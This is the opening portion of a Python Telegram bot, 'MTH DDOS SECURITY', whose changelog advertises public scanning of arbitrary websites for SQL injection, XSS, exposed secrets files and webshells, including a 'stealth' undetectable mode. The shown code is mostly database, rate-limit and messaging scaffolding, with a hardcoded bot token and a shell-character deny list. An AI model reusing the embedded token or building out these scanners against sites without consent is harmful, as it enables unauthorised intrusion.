#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════════╗
║  MTH DDOS SECURITY - TELEGRAM BOT v5.1                    ║
║  Advanced Security Testing Tools                          ║
║  Credits: @OnlyExaltarei, @Thebesty9, @PETER_DNS          ║
╚══════════════════════════════════════════════════════════════╝

CHANGELOG v5.0:
- NEW: /ssl — Auditoria SSL/TLS completa (TLS version, cipher, HSTS, cert validity)
- NEW: /headers — Security Headers analysis with A-F grade
- NEW: /cors — CORS misconfiguration testing
- NEW: /robots — robots.txt analyzer with hidden directories
- NEW: /sitemap — sitemap.xml parser
- NEW: /tech — Advanced tech detection (Wappalyzer-like, 50+ technologies)
- NEW: /exposed — Sensitive file exposure scanner (.env, .git, .htpasswd, etc.)
- NEW: /backup — Exposed backup finder (.bak, .zip, .sql, .tar.gz)
- NEW: /api — API endpoint discovery (/api, /graphql, /swagger, etc.)
- NEW: /shell — Webshell hunter (c99, r57, indoxploit, etc.)
- NEW: /config — Configuration file exposure scanner
- NEW: /traceroute — Network traceroute
- NEW: /whois — Domain whois lookup (registrar, creation, expiry, DNSSEC)
- NEW: /ip — Advanced GeoIP (ASN, ISP, proxy/VPN detection, abuse history)
- NEW: /rate — Site security rating (0-100 score)
- NEW: /compare — Compare two sites security
- NEW: /history — Scan history for a domain
- NEW: /top — Top vulnerable sites scanned
- NEW: /pdf — Generate PDF scan report
- NEW: /schedule — Schedule a scan for later
- NEW: /maintenance — Owner maintenance mode
- NEW: /cooldown — Configure rate limit per user
- NEW: /vip — Add/remove VIP users (no rate limit)
- NEW: /log — Detailed command logs
- NEW: /clearlogs — Clear old logs
- NEW: /broadcast — Schedule broadcast for later
- IMPROVE: /sqli — Blind SQLi detection, boolean/time/UNION separated
- IMPROVE: /xss — DOM-based detection, polyglot payloads
- IMPROVE: /ports — Custom port list, better banner grabbing
- IMPROVE: /sub — 100+ subdomains + permutation scan
- IMPROVE: /dirs — 150+ directories + wordlist mode
- IMPROVE: /wp — Known vuln plugins/themes detection
- IMPROVE: /dns — DNSSEC check, DMARC/SPF analysis
- IMPROVE: Queue system for concurrent scans
- IMPROVE: Stealth mode for slower undetectable scans
- IMPROVE: Export scan results
- IMPROVE: Notify when site status changes
- PERF: Optimized database with new indexes
- PERF: VIP users bypass rate limit

CHANGELOG v4.1:
- NEW: /msg command — owners broadcast message to ALL users
- PERF: Cleanup USER_CMD_COUNT every 2 min (prevent memory leak)
- PERF: rate limit sleep between send_long_message chunks
- FIX: Laravel duplicate in CMS detector dict
- FIX: Django missing from url_sigs dict
- FIX: send_message_safe HTML entity decode order (and last)
- FIX: /start accepts @botname suffix without crash
- FIX: CMD_HANDLERS lambdas pass args to all handlers
- FIX: /bancodds dump escapes usernames with HTML chars
- FIX: /logs target escaped to prevent HTML injection
- IMPROVE: /help — reorganized, more detailed descriptions
- IMPROVE: /ping — shows total users count
- IMPROVE: /status — shows RAM, threads, DB size
- IMPROVE: /sqli — 30 payloads (added time-based attacks)
- IMPROVE: /xss — 18 payloads (added Angular/Vue/React)
- IMPROVE: /ports — 35 ports (added 3000,4000,5000,8000,8888,9090)
- IMPROVE: /admin — 85+ paths (added shell/cmd/config dirs)
- IMPROVE: /dirs — 45 directories (added .aws, .ssh, vendor)
- IMPROVE: /sub — 35 subdomains (added login,forum,git)
- IMPROVE: /wp — detect known vuln plugins
- IMPROVE: /dns — added SOA record query

CHANGELOG v4.3:
- FIX: /panel restored to Painel Admin Finder (encontrar painéis de sites)
- NEW: /botpanel — Painel admin do bot (donos)
- NEW: /panel agora é comando PÚBLICO para encontrar painéis admin
- FIX: process_update LAST_SEND_TIME_CLEANUP missing global declaration
- FIX: /ping latency calculation preserved (bot + API separate)
- IMPROVE: /panel — melhorado com 100+ paths, anti-wildcard, anti-SPA
- IMPROVE: set_commands.py atualizado com /botpanel e /panel
- IMPROVE: /cms — added Squarespace, Weebly detection
- IMPROVE: /panel — shows DB file size
- IMPROVE: /bancodds — better formatting
- NEW: /feedback — Enviar feedback/sugestões para o canal dos donos
- NEW: /report — Reportar bugs para o canal dos donos
- NEW: /stop — Parar scans ativos (donos)
- NEW: /rescan — Inline button para reescanear (sem precisar digitar novamente)
- IMPROVE: /sqli — verbose mode (/sqli url verbose) mostra cada payload testado
- IMPROVE: /xss — verbose mode (/xss url verbose) mostra cada payload testado
- IMPROVE: Resultados dos scanners agora incluem inline buttons (🔄 Rescan)
- IMPROVE: Cache de resultados salvo no banco (scan_cache table)
- NEW: DB tables: feedback, bug_reports, scan_cache, scan_tasks

CHANGELOG v3.6:
- FIX: SQLi scanner — safe="" in requests.utils.quote to encode quotes properly
- FIX: XSS scanner — stricter unescaped reflection check, partial match removed
- FIX: DNS Tools — Android fallback (nslookup/getaddrinfo instead of dig)
- FIX: FTP/SSH scanner — proper socket cleanup on banner recv failure
- FIX: /ping — bot latency now measured separately from API latency
- FIX: /logs — SQL injection via f-string in LIMIT clause fixed (parameterized)
- FIX: /logs username search — escape LIKE wildcards (% and _)
- FIX: Admin Finder — added 20+ more paths, removed duplicates with dir scanner
- FIX: Directory Scanner — removed duplicate paths already in Admin Finder
- FIX: Subdomain Scanner — now verifies HTTP response, not just DNS resolution
- FIX: send_document — waits for send confirmation before deleting temp file
- FIX: send_long_message — respects 4096 char limit properly
- FIX: log_user/log_command — uses context manager for DB connections
- FIX: Polling — added max retry limit for 502/503, prevents infinite loop
- FIX: Polling — offset not advanced on process_update crash
- FIX: send_message_safe — plain text fallback sanitizes HTML entities
- FIX: Rate limit (429) handling with exponential backoff
- FIX: Removed duplicate paths between /admin and /dirs
- FIX: /help and /start now show different, purpose-specific messages
- IMPROVE: Added retry with exponential backoff for all HTTP requests
- IMPROVE: Added graceful shutdown with SIGTERM/SIGINT
- IMPROVE: Added thread pool limit to prevent OOM from spam
- IMPROVE: All tools now use proper timeout and error handling
- IMPROVE: Admin Finder now 70+ paths with dedup
- IMPROVE: XSS scanner now checks context of reflection (inside tags vs plain text)

CHANGELOG v3.7:
- FIX: /ping bot latency now correctly excludes API latency
- FIX: send_document returns True/False for success confirmation
- FIX: /bancodds verifies send_document success before confirming
- FIX: handle_logs LIKE search uses with-context for DB connection
- FIX: Offset only advances after handler confirms completion
- FIX: Port scanner socket always closed (finally block)
- FIX: Offline detection — scanners show "site offline" instead of "no vuln found"
- FIX: send_message_safe HTML entity decode order corrected
- FIX: /info and /sqli — handle None baseline before starting scan
- IMPROVE: Version bumped to v3.7 in all display messages

CHANGELOG v3.9:
- PERF: Shared HTTP session (requests.Session) — connection pooling saves 100-300ms/request
- PERF: Shared thread pool — no more creating ThreadPoolExecutor per handler
- PERF: DB indexes on logs(user_id, username, timestamp) — faster queries
- PERF: get_user_stats single query — 4 queries → 1 query
- PERF: handlers dict moved to global scope — no lambda creation per update
- PERF: _safe_get retry delay reduced from 1s to 0.5s
- PERF: LAST_SEND_TIME auto-cleanup every 5 min — prevents memory leak
- PERF: send_message uses shared HTTP session
- PERF: Subdomain scanner uses _safe_get (has retry) instead of bare requests.get
- PERF: DNS tools checks `which dig` once at startup
- PERF: handle_ping / handle_panel use single datetime.now() call

CHANGELOG v3.9:
- FIX: log_user — UPSERT now updates username/first_name/last_name when they change
- FIX: /dns header — extract_hostname called BEFORE building the display header
- FIX: /sub — extract_hostname so full URLs are accepted
- FIX: /ports /ftpssh /dns handlers — show clean hostname in progress message
- FIX: send_message_safe — only fallback to plain text on HTML parse errors, not all 400s
- FIX: send_message 429 — max 3 retries to prevent RecursionError
- FIX: send_long_message — split lines longer than MAX into chunks
- FIX: CMS detector Django — removed duplicate 'Django' signature that caused false positive
- FIX: Admin Finder — deduplicated paths (admin1/admin2/admin3/cpanel were listed twice)
- FIX: init_db — uses context manager to prevent connection leak on crash
- FIX: /bancodds inline dump — escape HTML in dump content to prevent XSS
- FIX: DNS tools TXT — added nslookup fallback for Android/Termux

CHANGELOG v4.0:
- FIX: DNS DoH — _safe_get now accepts headers parameter (was silently ignored, DoH never worked)
- FIX: /reverse progress message — now shows clean hostname (extract_hostname)
- FIX: /wp progress message — now shows clean hostname
- FIX: All handler progress messages — /info, /sqli, /xss, /admin, /dirs, /cms, /emails show clean hostname
- FIX: /about version — updated from 3.8 to 4.0
- FIX: Usage text — updated from mega3_bot.py to Mth Ddos v1.py
- FIX: /ping — now uses HTTP_SESSION instead of bare requests.get
- FIX: WordPress scanner — added /wp-json/ as strong WP signal
- FIX: CMS detector — added Flask, FastAPI, Express, Ruby on Rails signatures
- PERF: _safe_get accepts custom headers (needed for DoH)
- PERF: Port scanner timeout reduced to 1s (faster scans)
- PERF: Email scraper — stricter TLD validation (min 2 chars after dot)
- PERF: Reverse IP — added ip-api.com fallback when socket reverse fails
- PERF: Added /status command — quick health check
- PERF: Per-user rate limit — max 10 commands per minute per user
- PERF: scan_pool max_workers reduced from 22 to 15 (better for Termux)
- PERF: send_message_safe retry on parse error (1x retry)
- PERF: Added error logging with timestamp to all handlers
"""

import os
import sys
import time
import random
import threading
import requests
import subprocess
import socket
import concurrent.futures
import re
import json
import sqlite3
import logging
import hmac
import html as html_lib
import hashlib
import signal
from datetime import datetime
from urllib.parse import urlparse, parse_qs
from bs4 import BeautifulSoup
from bs4 import XMLParsedAsHTMLWarning
import warnings
warnings.filterwarnings("ignore", category=XMLParsedAsHTMLWarning)
from colorama import Fore, Back, Style, init
import urllib3
import string as string_mod

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
init(autoreset=True)

# ═══════════════════════════════════════════════════════════════
#  PERFORMANCE: Shared HTTP session (connection pooling)
# ═══════════════════════════════════════════════════════════════
HTTP_SESSION = requests.Session()
HTTP_SESSION.verify = False
_http_adapter = requests.adapters.HTTPAdapter(
    pool_connections=10, pool_maxsize=10,
    max_retries=requests.adapters.Retry(total=0)
)
HTTP_SESSION.mount('http://', _http_adapter)
HTTP_SESSION.mount('https://', _http_adapter)

# Shared thread pool — avoids creating ThreadPoolExecutor per handler
SCAN_POOL = concurrent.futures.ThreadPoolExecutor(max_workers=15)

# DNS tools: check dig availability once at startup
_HAS_DIG = False
try:
    _HAS_DIG = subprocess.run(['which', 'dig'], capture_output=True, timeout=2).returncode == 0
except:
    pass

# ═══════════════════════════════════════════════════════════════
#  HELPER FUNCTIONS
# ═══════════════════════════════════════════════════════════════

def random_string(length=12):
    """Generate a random alphanumeric string for baseline requests"""
    return ''.join(random.choices(string_mod.ascii_lowercase + string_mod.digits, k=length))

def extract_hostname(target):
    """Extract clean hostname/IP from a URL or raw domain/IP input.
    Handles: http://mthteam.com, https://mthteam.com:8080, mthteam.com, 8.8.8.8
    Returns the bare hostname or IP string."""
    if '://' in target:
        parsed = urlparse(target)
        hostname = parsed.hostname or parsed.netloc.split(':')[0].split('@')[-1]
        return hostname if hostname else target
    return target

# ═══════════════════════════════════════════════════════════════
#  TELEGRAM CONFIG
# ═══════════════════════════════════════════════════════════════
TELEGRAM_TOKEN = "8534082821:AAGJWMhlW27eU0kjB4QHul6knrX8pGRIUjw"
API_URL = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}"

# DONOS DO BOT (IDs do Telegram)
OWNERS = {
    6822870889: "@OnlyExaltarei",
    5658716257: "@Thebesty9",
    8716411086: "@PETER_DNS",
}

# Bot start time for uptime tracking
BOT_START_TIME = time.time()

# Graceful shutdown flag
SHUTDOWN_FLAG = False

# Rate limit tracking per chat_id
LAST_SEND_TIME = {}
SEND_COOLDOWN = 0.3  # seconds between messages to same chat
LAST_SEND_TIME_CLEANUP = 0  # Track when we last cleaned old entries
SEND_TIME_MAX_AGE = 300  # Clean entries older than 5 minutes

# Per-user command rate limit (max commands per minute)
USER_CMD_COUNT = {}  # user_id -> [timestamps]
USER_CMD_LIMIT = 10  # max 10 commands per minute per user
USER_CMD_WINDOW = 60  # 60 second window

# ═══════════════════════════════════════════════════════════════
#  NEW FEATURES: Cache, Ban, Error Log, Progress
# ═══════════════════════════════════════════════════════════════

# V4.3: Feedback channel (from user)
FEEDBACK_CHANNEL = "-1004392422665"

# V5.0: Maintenance mode
MAINTENANCE_MODE = False
MAINTENANCE_MSG = ""

# V5.0: VIP users (no rate limit, priority scans)
VIP_USERS = set()  # user_ids with VIP status

# V5.0: Custom rate limits per user
CUSTOM_RATE_LIMITS = {}  # user_id -> {limit: int, window: int}

# V5.0: Scheduled tasks
SCHEDULED_TASKS = {}  # task_id -> {time: float, chat_id: int, cmd: str, target: str, user_id: int}

# V5.0: Stealth mode tracking
STEALTH_MODE = False  # boolean: True when a stealth scan is active

# V5.0: Scan queue for managing concurrency
SCAN_QUEUE = []  # Queue of pending scans
SCAN_QUEUE_LOCK = threading.Lock()

# V5.0: Site status monitoring
SITE_STATUS_CACHE = {}  # (user_id, target) -> {last_status: bool, last_check: float}

# V4.3: Active scans tracking (for /stop)
ACTIVE_SCANS = {}  # scan_id -> threading.Event (set to stop)
STOP_EVENTS = {}   # user_id -> threading.Event

# V4.3: DB-backed cache TTL (seconds)
DB_CACHE_TTL = 600  # 10 minutes (V5.1: increased for better caching)

# Result cache: (command, target) -> (result_text, timestamp)
RESULT_CACHE = {}
CACHE_TTL = 300  # 5 minutes cache

# Banned users
BANNED_USERS = set()  # user_ids banned by /ban

def load_vip_users():
    """Load VIP users from DB on startup"""
    try:
        with sqlite3.connect(DB_PATH) as conn:
            c = conn.cursor()
            c.execute("SELECT user_id FROM vip_users")
            for row in c.fetchall():
                VIP_USERS.add(row[0])
    except:
        pass

def is_vip(user_id):
    """Check if user is VIP (no rate limit)"""
    return user_id in VIP_USERS

def get_user_rate_limit(user_id):
    """Get rate limit for user (VIP = unlimited, custom = custom, default = 10/min)"""
    if is_vip(user_id) or is_owner(user_id):
        return 999, 60  # Effectively unlimited
    if user_id in CUSTOM_RATE_LIMITS:
        cl = CUSTOM_RATE_LIMITS[user_id]
        return cl['limit'], cl['window']
    return USER_CMD_LIMIT, USER_CMD_WINDOW

def audit_log(user_id, username, action, details):
    """Log an audit event"""
    now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    try:
        with sqlite3.connect(DB_PATH) as conn:
            c = conn.cursor()
            c.execute("INSERT INTO audit_log (user_id, username, action, details, timestamp) VALUES (?, ?, ?, ?, ?)",
                      (user_id, username, action, details[:500], now))
            conn.commit()
    except Exception as e:
        print(f"[DB Error] audit_log: {e}")

def load_banned_users():
    """Load banned users from DB on startup"""
    try:
        with sqlite3.connect(DB_PATH) as conn:
            c = conn.cursor()
            c.execute("SELECT user_id FROM banned_users")
            for row in c.fetchall():
                BANNED_USERS.add(row[0])
    except:
        pass

def sanitize_url(url):
    """Sanitize URL input to prevent command injection and SSRF attempts"""
    if not url:
        return None
    url = url.strip()
    # Remove dangerous chars (command injection, SSRF, pipe)
    for char in [';', '|', '&', '$', '`', '(', ')']:
        url = url.replace(char, '')
    # Limit length
    if len(url) > 2048:
        url = url[:2048]
    return url

def get_cached_result(cmd, target):
    """Get cached result if available and not expired"""
    key = (cmd, target)
    if key in RESULT_CACHE:
        result, ts = RESULT_CACHE[key]
        if time.time() - ts < CACHE_TTL:
            return result
        else:
            del RESULT_CACHE[key]
    return None

def set_cached_result(cmd, target, result):
    """Store result in cache"""
    key = (cmd, target)
    RESULT_CACHE[key] = (result, time.time())
    # Cleanup old entries if cache is too big
    if len(RESULT_CACHE) > 200:
        now = time.time()
        stale = [k for k, (_, ts) in RESULT_CACHE.items() if now - ts > CACHE_TTL]
        for k in stale:
            del RESULT_CACHE[k]

# Error log file
def log_error(module, error):
    """Log error to file with timestamp"""
    ts = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    line = f"[{ts}] [{module}] {error}\n"
    try:
        with open(ERROR_LOG_PATH, "a") as f:
            f.write(line)
    except:
        pass
    print(f"[ERROR LOG] {module}: {error}")

# Progress tracking for long-running scans
SCAN_PROGRESS = {}  # scan_id -> {current, total, message, chat_id}

def send_progress(chat_id, scan_id, current, total, message=""):
    """Send progress update for long-running scans"""
    pct = int((current / total) * 100) if total > 0 else 0
    progress_msg = f"⏳ <b>{message}</b>\n📊 Progresso: {current}/{total} ({pct}%)"
    try:
        resp = HTTP_SESSION.post(f"{API_URL}/sendMessage", json={
            "chat_id": chat_id,
            "text": progress_msg,
            "parse_mode": "HTML"
        }, timeout=5)
        if resp and resp.status_code == 200:
            msg_id = resp.json().get('result', {}).get('message_id')
            SCAN_PROGRESS[scan_id] = {'msg_id': msg_id, 'chat_id': chat_id, 'current': current, 'total': total}
            return msg_id
    except:
        pass
    return None

def edit_progress(msg_id, chat_id, current, total, message=""):
    """Edit a progress message with updated percentage"""
    if not msg_id:
        return
    pct = int((current / total) * 100) if total > 0 else 0
    progress_msg = f"⏳ <b>{message}</b>\n📊 Progresso: {current}/{total} ({pct}%)"
    try:
        HTTP_SESSION.post(f"{API_URL}/editMessageText", json={
            "chat_id": chat_id,
            "message_id": msg_id,
            "text": progress_msg,
            "parse_mode": "HTML"
        }, timeout=5)
    except:
        pass

def finish_progress(msg_id, chat_id, final_message):
    """Delete the progress message after scan completes"""
    if not msg_id:
        return
    try:
        HTTP_SESSION.post(f"{API_URL}/deleteMessage", json={
            "chat_id": chat_id,
            "message_id": msg_id
        }, timeout=5)
    except:
        pass

# ═══════════════════════════════════════════════════════════════
#  DATABASE - LOG DE USUÁRIOS
# ═══════════════════════════════════════════════════════════════
# Use Termux home directory to avoid Scoped Storage issues on Android
DB_DIR = os.path.join(os.path.expanduser("~"), ".mega3_bot")
os.makedirs(DB_DIR, exist_ok=True)
DB_PATH = os.path.join(DB_DIR, "mega3_bot.db")
ERROR_LOG_PATH = os.path.join(DB_DIR, "error_log.txt")

def init_db():
    with sqlite3.connect(DB_PATH) as conn:
        c = conn.cursor()
        c.execute('''CREATE TABLE IF NOT EXISTS users (
            id INTEGER PRIMARY KEY,
            username TEXT,
            first_name TEXT,
            last_name TEXT,
            is_owner INTEGER DEFAULT 0,
            first_seen TEXT,
            last_seen TEXT,
            command_count INTEGER DEFAULT 0
        )''')
        c.execute('''CREATE TABLE IF NOT EXISTS logs (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id INTEGER,
            username TEXT,
            command TEXT,
            target TEXT,
            timestamp TEXT,
            result_summary TEXT
        )''')
        c.execute('CREATE INDEX IF NOT EXISTS idx_logs_user_id ON logs(user_id)')
        c.execute('CREATE INDEX IF NOT EXISTS idx_logs_username ON logs(username)')
        c.execute('CREATE INDEX IF NOT EXISTS idx_logs_timestamp ON logs(timestamp DESC)')
        c.execute('''CREATE TABLE IF NOT EXISTS banned_users (
            user_id INTEGER PRIMARY KEY,
            username TEXT,
            reason TEXT,
            banned_at TEXT,
            banned_by INTEGER
        )''')
        c.execute('''CREATE TABLE IF NOT EXISTS owner_logs (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id INTEGER,
            username TEXT,
            command TEXT,
            timestamp TEXT
        )''')
        # V4.3: Feedback channel
        c.execute('''CREATE TABLE IF NOT EXISTS feedback (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id INTEGER,
            username TEXT,
            first_name TEXT,
            message TEXT,
            timestamp TEXT,
            channel_msg_id INTEGER DEFAULT 0
        )''')
        c.execute('CREATE INDEX IF NOT EXISTS idx_feedback_user_id ON feedback(user_id)')
        # V4.3: Bug reports channel
        c.execute('''CREATE TABLE IF NOT EXISTS bug_reports (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id INTEGER,
            username TEXT,
            first_name TEXT,
            message TEXT,
            timestamp TEXT,
            channel_msg_id INTEGER DEFAULT 0
        )''')
        c.execute('CREATE INDEX IF NOT EXISTS idx_bug_reports_user_id ON bug_reports(user_id)')
        # V4.3: DB-backed result cache
        c.execute('''CREATE TABLE IF NOT EXISTS scan_cache (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            cmd TEXT NOT NULL,
            target TEXT NOT NULL,
            result TEXT,
            created_at REAL,
            UNIQUE(cmd, target)
        )''')
        c.execute('CREATE INDEX IF NOT EXISTS idx_scan_cache_key ON scan_cache(cmd, target)')
        # V5.0: VIP users table
        c.execute('''CREATE TABLE IF NOT EXISTS vip_users (
            user_id INTEGER PRIMARY KEY,
            username TEXT,
            added_at TEXT,
            added_by INTEGER
        )''')
        # V5.0: Scheduled tasks table
        c.execute('''CREATE TABLE IF NOT EXISTS scheduled_tasks (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id INTEGER NOT NULL,
            chat_id TEXT NOT NULL,
            cmd TEXT NOT NULL,
            target TEXT NOT NULL,
            scheduled_time REAL NOT NULL,
            status TEXT DEFAULT 'pending',
            created_at TEXT
        )''')
        c.execute('CREATE INDEX IF NOT EXISTS idx_scheduled_status ON scheduled_tasks(status)')
        # V5.0: Site monitoring table
        c.execute('''CREATE TABLE IF NOT EXISTS site_monitor (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id INTEGER NOT NULL,
            target TEXT NOT NULL,
            chat_id TEXT NOT NULL,
            last_status INTEGER DEFAULT 0,
            last_check REAL DEFAULT 0,
            UNIQUE(user_id, target)
        )''')
        c.execute('CREATE INDEX IF NOT EXISTS idx_site_monitor_target ON site_monitor(target)')
        # V5.1: Add watch columns to site_monitor (migration)
        try:
            c.execute("ALTER TABLE site_monitor ADD COLUMN content_hash TEXT DEFAULT ''")
        except:
            pass
        try:
            c.execute("ALTER TABLE site_monitor ADD COLUMN watch_interval INTEGER DEFAULT 5")
        except:
            pass
        try:
            c.execute("ALTER TABLE site_monitor ADD COLUMN watch_type TEXT DEFAULT 'status'")
        except:
            pass
        # V5.0: Audit log table
        c.execute('''CREATE TABLE IF NOT EXISTS audit_log (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id INTEGER,
            username TEXT,
            action TEXT,
            details TEXT,
            timestamp TEXT
        )''')
        c.execute('CREATE INDEX IF NOT EXISTS idx_audit_user ON audit_log(user_id)')
        c.execute('CREATE INDEX IF NOT EXISTS idx_audit_timestamp ON audit_log(timestamp DESC)')
        # V4.3: Active scan tasks (for /stop)
        c.execute('''CREATE TABLE IF NOT EXISTS scan_tasks (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id INTEGER NOT NULL,
            scan_type TEXT NOT NULL,
            target TEXT NOT NULL,
            started_at REAL,
            status TEXT DEFAULT 'running',
            progress_msg_id INTEGER DEFAULT 0,
            chat_id TEXT DEFAULT ''
        )''')
        conn.commit()

def log_user(user_id, username, first_name, last_name):
    is_owner = 1 if user_id in OWNERS else 0
    now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    try:
        with sqlite3.connect(DB_PATH) as conn:
            c = conn.cursor()
            # FIX v3.9: UPSERT now updates ALL fields including username/first_name/last_name
            c.execute("""INSERT INTO users (id, username, first_name, last_name, is_owner, first_seen, last_seen, command_count)
                         VALUES (?, ?, ?, ?, ?, ?, ?, 1)
                         ON CONFLICT(id) DO UPDATE SET
                            username = excluded.username,
                            first_name = excluded.first_name,
                            last_name = excluded.last_name,
                            is_owner = excluded.is_owner,
                            last_seen = excluded.last_seen,
                            command_count = command_count + 1""",
                      (user_id, username, first_name, last_name, is_owner, now, now))
            conn.commit()
    except Exception as e:
        print(f"[DB Error] log_user: {e}")

def log_command(user_id, username, command, target, result_summary=""):
    now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    try:
        with sqlite3.connect(DB_PATH) as conn:
            c = conn.cursor()
            c.execute("INSERT INTO logs (user_id, username, command, target, timestamp, result_summary) VALUES (?, ?, ?, ?, ?, ?)",
                      (user_id, username, command, target, now, result_summary[:500]))
            conn.commit()
    except Exception as e:
        print(f"[DB Error] log_command: {e}")

def log_owner_command(user_id, username, command):
    now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    try:
        with sqlite3.connect(DB_PATH) as conn:
            c = conn.cursor()
            c.execute("INSERT INTO owner_logs (user_id, username, command, timestamp) VALUES (?, ?, ?, ?)",
                      (user_id, username, command, now))
            conn.commit()
    except Exception as e:
        print(f"[DB Error] log_owner_command: {e}")

def get_recent_logs(limit=20):
    try:
        with sqlite3.connect(DB_PATH) as conn:
            conn.row_factory = sqlite3.Row
            c = conn.cursor()
            # FIX: parameterized LIMIT
            c.execute("SELECT * FROM logs ORDER BY id DESC LIMIT ?", (limit,))
            rows = [dict(r) for r in c.fetchall()]
            return rows
    except Exception as e:
        print(f"[DB Error] get_recent_logs: {e}")
        return []

def get_user_logs(user_id, limit=20):
    try:
        with sqlite3.connect(DB_PATH) as conn:
            conn.row_factory = sqlite3.Row
            c = conn.cursor()
            c.execute("SELECT * FROM logs WHERE user_id = ? ORDER BY id DESC LIMIT ?", (user_id, limit))
            rows = [dict(r) for r in c.fetchall()]
            return rows
    except Exception as e:
        print(f"[DB Error] get_user_logs: {e}")
        return []

def get_user_stats():
    try:
        with sqlite3.connect(DB_PATH) as conn:
            c = conn.cursor()
            # PERF: Single query instead of 4 separate queries
            c.execute("""SELECT
                (SELECT COUNT(*) FROM users) as total,
                (SELECT COUNT(*) FROM users WHERE is_owner = 1) as owners,
                (SELECT COUNT(*) FROM users WHERE is_owner = 0) as regular,
                (SELECT COUNT(*) FROM logs) as commands
            """)
            row = c.fetchone()
            return {"total": row[0], "owners": row[1], "regular": row[2], "commands": row[3]}
    except Exception as e:
        print(f"[DB Error] get_user_stats: {e}")
        return {"total": 0, "owners": 2, "regular": 0, "commands": 0}

def get_db_dump():
    dump = "=== USERS ===\n"
    try:
        with sqlite3.connect(DB_PATH) as conn:
            conn.row_factory = sqlite3.Row
            c = conn.cursor()

            c.execute("SELECT * FROM users")
            for r in c.fetchall():
                d = dict(r)
                dump += f"ID:{d['id']} @{d['username']} | {d['first_name']} {d['last_name'] or ''} | Owner:{'Yes' if d['is_owner'] else 'No'} | Cmds:{d['command_count']} | First:{d['first_seen']} | Last:{d['last_seen']}\n"

            dump += "\n=== LOGS ===\n"
            c.execute("SELECT * FROM logs ORDER BY id DESC LIMIT 50")
            for r in c.fetchall():
                d = dict(r)
                dump += f"#{d['id']} @{d['username']} /{d['command']} {d['target'] or ''} [{d['timestamp']}]\n"

            dump += "\n=== OWNER LOGS ===\n"
            c.execute("SELECT * FROM owner_logs ORDER BY id DESC LIMIT 20")
            for r in c.fetchall():
                d = dict(r)
                dump += f"#{d['id']} @{d['username']} /{d['command']} [{d['timestamp']}]\n"
    except Exception as e:
        dump += f"\n[DB Error] {e}\n"
    return dump

init_db()
load_banned_users()
load_vip_users()

# ═══════════════════════════════════════════════════════════════
#  TELEGRAM HELPERS
# ═══════════════════════════════════════════════════════════════
def _rate_limit_wait(chat_id):
    """Prevent Telegram 429 rate limit by spacing messages"""
    global LAST_SEND_TIME, LAST_SEND_TIME_CLEANUP
    now = time.time()
    # PERF: Cleanup old entries every 5 min to prevent memory leak
    if now - LAST_SEND_TIME_CLEANUP > SEND_TIME_MAX_AGE:
        cutoff = now - SEND_TIME_MAX_AGE
        LAST_SEND_TIME = {k: v for k, v in LAST_SEND_TIME.items() if v > cutoff}
        LAST_SEND_TIME_CLEANUP = now
    last = LAST_SEND_TIME.get(chat_id, 0)
    elapsed = now - last
    if elapsed < SEND_COOLDOWN:
        time.sleep(SEND_COOLDOWN - elapsed)
    LAST_SEND_TIME[chat_id] = time.time()

def send_message(chat_id, text, parse_mode="HTML"):
    """Send message with rate limiting and retry on 429 (uses shared HTTP session)"""
    _rate_limit_wait(chat_id)
    try:
        resp = HTTP_SESSION.post(f"{API_URL}/sendMessage", json={
            "chat_id": chat_id,
            "text": text,
            "parse_mode": parse_mode,
            "disable_web_page_preview": True
        }, timeout=10)
        if resp.status_code == 429:
            # FIX v3.9: Max 3 retries to prevent RecursionError
            retry_after = resp.json().get('parameters', {}).get('retry_after', 5)
            time.sleep(retry_after)
            resp = HTTP_SESSION.post(f"{API_URL}/sendMessage", json={
                "chat_id": chat_id,
                "text": text,
                "parse_mode": parse_mode,
                "disable_web_page_preview": True
            }, timeout=10)
            if resp.status_code == 429:
                retry_after = resp.json().get('parameters', {}).get('retry_after', 5)
                time.sleep(retry_after)
                resp = HTTP_SESSION.post(f"{API_URL}/sendMessage", json={
                    "chat_id": chat_id,
                    "text": text,
                    "parse_mode": parse_mode,
                    "disable_web_page_preview": True
                }, timeout=10)
        return resp
    except Exception as e:
        print(f"[Send Error] {e}")
        return None

def send_message_safe(chat_id, text, parse_mode="HTML"):
    """Send message with fallback to plain text if HTML fails"""
    try:
        resp = send_message(chat_id, text, parse_mode)
        if resp and resp.status_code == 200:
            return resp
        # FIX v3.9: Only fallback on HTML parse errors (not all 400s)
        # Check if the error is specifically about parse_mode/HTML
        if resp and resp.status_code == 400:
            error_desc = ""
            try:
                error_desc = resp.json().get('description', '').lower()
            except:
                pass
            if 'can\'t parse entities' in error_desc or 'parse_mode' in error_desc or 'unknown entity' in error_desc or 'bad request' in error_desc:
                # This is a real HTML parse error — fallback to plain text
                plain = re.sub(r'<[^>]+>', '', text)
                plain = plain.replace('&lt;', '<').replace('&gt;', '>').replace('&quot;', '"').replace('&#39;', "'").replace('&amp;', '&')
                return send_message(chat_id, plain[:4000], parse_mode=None)
    except Exception as e:
        print(f"[Send Safe Error] {e}")
    return None

def send_document(chat_id, text, filename="report.txt"):
    """Send text as document file. Returns True on success, False on failure."""
    try:
        filepath = os.path.join(DB_DIR, filename)
        with open(filepath, "w") as f:
            f.write(text)
        with open(filepath, "rb") as f:
            resp = HTTP_SESSION.post(f"{API_URL}/sendDocument",
                data={"chat_id": chat_id, "caption": f"📄 {filename}"},
                files={"document": f}, timeout=30)
        if resp and resp.status_code == 200:
            os.remove(filepath)
            return True
        else:
            print(f"[Doc Error] Send failed (status {resp.status_code if resp else 'no response'}), file kept at {filepath}")
            return False
    except Exception as e:
        print(f"[Doc Error] {e}")
        return False

